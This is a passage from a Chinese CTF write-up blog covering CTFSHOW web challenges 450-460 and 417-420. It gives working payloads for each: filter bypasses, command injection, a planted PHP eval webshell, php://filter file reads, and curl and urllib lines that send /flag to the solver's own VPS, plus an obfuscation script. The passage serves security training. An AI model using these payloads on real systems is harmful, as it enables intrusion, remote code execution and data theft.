表示匹配一个脱义的插入符号 <code>^</code></li></ul><p>举个例子，也就是<code>abc^def^ghi</code>，满足正则匹配只要在中间加两个<code>^</code>即可。两个相同的字符异或，得到0，0和另一个字符异或，得到的便是另一个字符</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure><p>然后搜索flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827111327535.png"></p><h3 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h3><p><img src="https://oss.waynejoons.icu/picphoto/20250827113630839.png"></p><p>这题把<code>phpinfo</code>过滤了。前面提到，两个相同的字符异或，得到0，0和另一个字符异或，得到另一个字符，所以我们两两修改一下就好</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=aaabbbb^phpbbbb^aaainfo</span><br></pre></td></tr></table></figure><h3 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h3><p><img src="https://oss.waynejoons.icu/picphoto/20250827115632362.png"></p><p>这题过滤了挺多东西，但操作空间依然很大，直接执行代码就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=echo `ls /`;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250827120030617.png"></p><p>然后读取<code>flaag</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=echo `cat /flaag`;</span><br></pre></td></tr></table></figure><p>后面在网上看了其他方法，可以用括号包住进行字符串拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(php.info)();</span><br></pre></td></tr></table></figure><h3 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h3><p>打开网站查看源代码，可以看到提示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827125927307.png"></p><p>我们GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/show?s=XXX</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=index.php</span><br></pre></td></tr></table></figure><p>然后查看网页源码，可以看到<code>index.php</code>代码，下面展示部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;command exec done&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是我们访问路径<code>/ctf/file</code>，然后POST传入内容，就会被写进<code>shell.php</code>。接着再访问路径<code>/ctf/exec</code>就可以执行<code>shell.php</code>的代码</p><p>同样的，我们用curl外带执行系统命令即可</p><p>首先GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/file</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&lt;?php system(&#x27;curl http://你的vps地址:端口?p=`cat f*`&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/ctf/exec</code>，最后在服务器查看结果即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827131321033.png"></p><h3 id="web454"><a href="#web454" class="headerlink" title="web454"></a>web454</h3><p>跟上题一样，我们先查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">include</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;include done&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题把<code>system</code>换成<code>include</code>了，方法跟之前一样，只是最后的路径要改一下</p><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/file</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&lt;?php system(&#x27;curl http://你的vps地址:端口?p=`cat f*`&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/ctf/include</code>，最后在服务器查看结果即可</p><h3 id="web455"><a href="#web455" class="headerlink" title="web455"></a>web455</h3><p>查看源码，这题比上题多了个<code>reload</code>函数，但是用处不大。同时<code>include</code>函数也改回<code>exec</code>函数了，可以用回web453的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reload</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$http</span>;</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">reload</span>();</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;reload done&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/file</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&lt;?php system(&#x27;curl http://你的vps地址:端口?p=`cat f*`&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/ctf/exec</code>，最后在服务器查看结果</p><h3 id="web456"><a href="#web456" class="headerlink" title="web456"></a>web456</h3><p>除去<code>reload</code>函数，这题源码相比web453没怎么变，就只是改了end信息，因此可以继续用之前的方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827133933917.png"></p><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/file</span><br></pre></td></tr></table></figure><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&lt;?php system(&#x27;curl http://你的vps地址:端口?p=`cat f*`&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/ctf/exec</code>，最后在服务器查看结果</p><h3 id="web457"><a href="#web457" class="headerlink" title="web457"></a>web457</h3><p>我们看看admin类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>==<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单分析一下</p><ul><li><code>check()</code> 中调用了 <code>call_user_func($this-&gt;password)</code>：<ul><li><code>call_user_func</code> 用于调用回调函数，参数可以是函数名字符串或可调用变量</li><li>这里 <code>$this-&gt;password</code> 被当成函数名调用，函数执行的结果赋给 <code>$u</code></li></ul></li><li>最后判断 <code>$u</code> 是否等于 <code>&#39;admin&#39;</code>，相等则返回 <code>true</code>，否则返回 <code>false</code></li></ul><p>因此我们传入<code>p=phpinfo</code>触发函数使其返回值为True即可，然后传入<code>u=admin</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=admin&amp;p=phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250827135630855.png"></p><h3 id="web458"><a href="#web458" class="headerlink" title="web458"></a>web458</h3><p>这题改为<code>$u===&#39;admin&#39;</code>，变成强比较了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为类名为admin，我们可以给p传入<code>get_class</code>获取类名，然后再传入<code>u=admin</code>，就满足条件了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=admin&amp;p=get_class</span><br></pre></td></tr></table></figure><h3 id="web459"><a href="#web459" class="headerlink" title="web459"></a>web459</h3><p><img src="https://oss.waynejoons.icu/picphoto/20250827141646415.png"></p><p>这题用了copy函数，PHP 中的<code>copy()</code>函数是用于<strong>复制文件</strong>的内置函数</p><p><strong>语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool copy ( string $source , string $dest [, resource $context ] )</span><br></pre></td></tr></table></figure><ul><li><code>$source</code>：必需，要复制的源文件路径</li><li><code>$dest</code>：必需，目标文件路径（包含文件名）</li><li><code>$context</code>：可选的上下文资源</li></ul><p>我们用php伪协议即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=php://filter/read=convert.base64-encode/resource=flag.php&amp;p=1</span><br></pre></td></tr></table></figure><p>然后访问路径<code>/1.php</code>读取flag的base64编码，解码即可</p><h3 id="web460"><a href="#web460" class="headerlink" title="web460"></a>web460</h3><p>这题跟web449相比，多了一些时间检测的代码，我们看看关键部分</p><p><img src="https://oss.waynejoons.icu/picphoto/20250827151120464.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">func_set_timeout</span>(<span class="number">0.7</span>)</span><br><span class="line">def <span class="title function_ invoke__">run</span>(s):</span><br><span class="line">    time.<span class="title function_ invoke__">sleep</span>(randmon.<span class="title function_ invoke__">random</span>())</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(s)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250827151207910.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s=<span class="title function_ invoke__">run</span>(code)</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">except func_timeout.exceptions.FunctionTimedOut:</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>有两个区别</p><p><strong>1. 执行超时机制</strong></p><p>使用了 <code>func-timeout</code> 库，为 <code>run</code> 函数设置了 <strong>0.7 秒的超时限制</strong>。这意味着如果传入的 <code>code</code> 执行时间超过 0.7 秒，程序会抛出 <code>FunctionTimedOut</code> 异常，从而中断执行</p><p><strong>2. 随机延迟</strong></p><p>在 <code>run</code> 函数中，执行 <code>eval</code> 之前有一个 <code>time.sleep(random.random())</code>。这会增加一个 0 到 1 秒之间的随机延迟</p><p>算上随机延迟，也就是我们传入的代码必须要执行时间小于0.7s</p><p>这题有些难，参考网上Y4tacker师傅的做法，可以配合<code>urllib</code>外带数据</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getNumber3</span>(<span class="params">number</span>):</span><br><span class="line">    number = <span class="built_in">int</span>(number)</span><br><span class="line">    <span class="keyword">if</span> number <span class="keyword">in</span> [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;~int(True)&quot;</span>, <span class="string">&quot;~int(False)&quot;</span>,</span><br><span class="line">                <span class="string">&quot;int(False)&quot;</span>, <span class="string">&quot;int(True)&quot;</span>][number + <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~%s&quot;</span> % getNumber3(~number)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(%s&lt;&lt;(int(True)))&quot;</span> % getNumber3(number / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getNumber2</span>(<span class="params">number</span>):</span><br><span class="line">    number = <span class="built_in">int</span>(number)</span><br><span class="line">    <span class="keyword">if</span> number <span class="keyword">in</span> [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;~([]&lt;())&quot;</span>, <span class="string">&quot;~([]&lt;[])&quot;</span>,</span><br><span class="line">                <span class="string">&quot;([]&lt;[])&quot;</span>, <span class="string">&quot;([]&lt;())&quot;</span>][number + <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~%s&quot;</span> % getNumber2(~number)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(%s&lt;&lt;([]&lt;()))&quot;</span> % getNumber2(number / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;import urllib.request;import ssl;f=open(&quot;/flag&quot;).read();context = ssl._create_unverified_context();url = &quot;http://你的vps地址:端口?p=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)&#x27;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;str().join([&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="string">f&quot;chr(<span class="subst">&#123;getNumber3(<span class="built_in">ord</span>(i))&#125;</span>),&quot;</span></span><br><span class="line">res = res[:-<span class="number">1</span>]</span><br><span class="line">res += <span class="string">&#x27;])&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;exec(&quot;</span>+res+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure><p>把结果拼接进Body然后POST发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=你的代码运行结果</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250827152501169.png"></p><p>简单解释一下这个代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;import urllib.request;import ssl;f=open(&quot;/flag&quot;).read();context = ssl._create_unverified_context();url = &quot;http://你的vps地址:端口?p=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><code>import urllib.request</code>：导入用于打开和读取 URL 的模块</li><li><code>import ssl</code>：导入处理 TLS&#x2F;SSL 连接的模块</li><li><code>f = open(&quot;/flag&quot;).read()</code>：打开根目录下的 <code>flag</code> 文件，读取内容，并赋值给变量 <code>f</code></li><li><code>context = ssl._create_unverified_context()</code>：创建一个不验证 SSL 证书的上下文环境，避免因证书问题阻塞请求</li><li><code>request = urllib.request.Request(url)</code>：创建针对该 URL 的 HTTP 请求</li><li><code>response = urllib.request.urlopen(url=request, context=context)</code>：发送请求并获取响应，使用前面创建的 SSL 上下文</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>yu22x：<a href="https://blog.csdn.net/miuzzx/article/details/112692697">CTFSHOW其他篇</a></p><p>Y4tacker：<a href="https://blog.csdn.net/solitudi/article/details/113778651">[CTFSHOW]CTFSHOW-其他WP</a></p>]]></content>
    
    
    <summary type="html">CTFSHOW 其他篇第三部分详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | 其他篇题解（二）web417 - web437</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-others-2-web417-web437/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-others-2-web417-web437/</id>
    <published>2025-08-22T12:26:56.000Z</published>
    <updated>2025-08-22T12:27:20.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于题目比较多，所以分三个部分来写，这是第二部分</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h3><p>有个<code>3.php</code>文件，下载后是一段加密代码，用ai解密</p><p>得到代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>==<span class="string">&#x27;show&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctf=show</span><br></pre></td></tr></table></figure><p>成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821205753136.png"></p><h3 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821184428179.png"></p><p>由于变量key已经被赋值为0，因此这个后门没什么用，需要另辟蹊径</p><p>然后我们可以看到有个<code>extract</code>函数，这是PHP里的一个函数调用。<code>extract()</code>作用是把数组里的键名当作变量名，在当前作用域创建同名变量，并赋值为数组的对应值。比如<code>$_POST[&#39;wayne&#39;]=123</code>时，<code>extract($_POST);</code>之后就有了变量<code>$wayne=123</code></p><p>我们看这个代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$die</span>?<span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>):<span class="title function_ invoke__">clear</span>(<span class="variable">$clear</span>);</span><br></pre></td></tr></table></figure><p>由于变量die没有被赋值，因此可以进行<strong>变量覆盖</strong>。这是<strong>三目运算符</strong>，我们可以传入0来触发后面的<code>clear($clear)</code></p><p>继续往下划，可以看到<code>clear</code>函数的定义</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821190543737.png"></p><p>给变量clear用<strong>分号截断命令</strong>即可，POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">die=0&amp;clear=;echo &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;&gt;/var/www/html/1.php</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250821191346821.png"></p><p>然后蚁剑连接</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821191130558.png"></p><p>在网页根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821191204131.png"></p><h3 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821210215038.png"></p><p>这题要求<strong>POST</strong>传入参数code，且长度要小于17，然后eval执行php代码</p><p>咱们用<strong>反引号</strong>执行命令即可，把当前目录下的<code>flag.php</code>复制到<code>1.txt</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=`cp f* 1.txt`;</span><br></pre></td></tr></table></figure><p>然后打开<code>1.txt</code>读取flag即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821210814466.png"></p><h3 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821213447055.png"></p><p>这次code长度被限制在8位以内，也就是7位，然后eval函数也换成了system。有几个方法可以做这题</p><p><strong>方法一：nl输出</strong></p><p>nl命令是Linux系统中的一个命令行工具，全称是“number lines”，用于给文本文件或标准输入的每一行添加行号，<strong>并将结果输出</strong>。它类似于cat 